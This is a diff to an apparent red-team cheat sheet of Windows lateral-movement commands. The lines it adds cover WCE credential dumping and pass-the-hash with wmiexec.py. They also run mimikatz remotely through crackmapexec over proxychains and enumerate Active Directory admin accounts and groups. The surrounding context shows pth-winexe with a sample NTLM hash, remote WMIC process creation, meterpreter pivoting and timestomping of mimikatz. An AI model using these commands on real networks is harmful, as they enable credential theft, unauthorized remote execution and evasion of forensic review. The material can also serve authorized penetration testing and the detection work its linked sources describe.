@@ -80,7 +80,13 @@ pth-winexe -U hash //IP cmd
 sc query winexesvc  
 sc start winexesvc  
 ./pth-winexe -U john%'921988ba001dc8e14a3b108f3fa6cb6d:e19ccf75ee54e06b06a5907af13cef42' --system //192.168.210.102 cmd.exe  
-xfreerdp /u:user /d:domain /pth:hash /v:IPAddress  
+xfreerdp /u:user /d:domain /pth:hash /v:IPAddress
+
+## WCE64.exe
+/usr/share/wce  
+wce64.exe  
+wce64.exe -s <username>:<domain>:<lmhash>:<nthash>  
+
 
 ## WMIC
 wmic useraccount list /format:list  
@@ -89,6 +95,7 @@ wmic path win32_process call create "calc.exe"
 wmic /node:computername /user:domainname\username path win32_process call create "**empire launcher string here**"  
 wmic /node:192.168.255.10 /user:"secplayground\john" path win32_process call create "calc.exe"  
 wmiexec.py -debug john:P@ssw0rd@192.168.210.102  
+wmiexec.py -debug -hashes xxxxxxxxxxxxxx:xxxxxxx  administrator@192.168.255.10
 
 ## Pivoting network
 (meterpreter) run autoroute -s 192.168.255.0/24  
@@ -117,7 +124,19 @@ schtasks /F /delete /tn foobar /S host
 ## Timestomp
 (meterpreter) timestomp mimikatz.exe -v  
 
+## crackmapexec
+proxychains crackmapexec 192.168.255.10 -u john -p 'P@ssw0rd' -M mimikatz -o COMMAND=privilege::debug
+
+
+# On AD
+powershell "[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()"  
+powershell "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()"  
+## Find admin user
+powershell "get-aduser -filter {AdminCount -eq 1} -Properties Name,AdminCount,ServicePrincipalName,PasswordLastSet,LastLogonDate,MemberOf"  
+## Find admin group
+powershell "get-adgroup -filter {GroupCategory -eq 'Security' -AND Name -like '*admin*'}"  
+
 # Resource::
-- https://www.botconf.eu/wp-content/uploads/2017/12/2017_tomonaga-muda-Hunting-Attacker-Activities.pdf
-- https://www.slideshare.net/votadlos/hunting-lateral-movement-in-windows-infrastructure
-- https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html#net-user-domain
+- https://www.botconf.eu/wp-content/uploads/2017/12/2017_tomonaga-muda-Hunting-Attacker-Activities.pdf  
+- https://www.slideshare.net/votadlos/hunting-lateral-movement-in-windows-infrastructure  
+- https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html#net-user-domain  
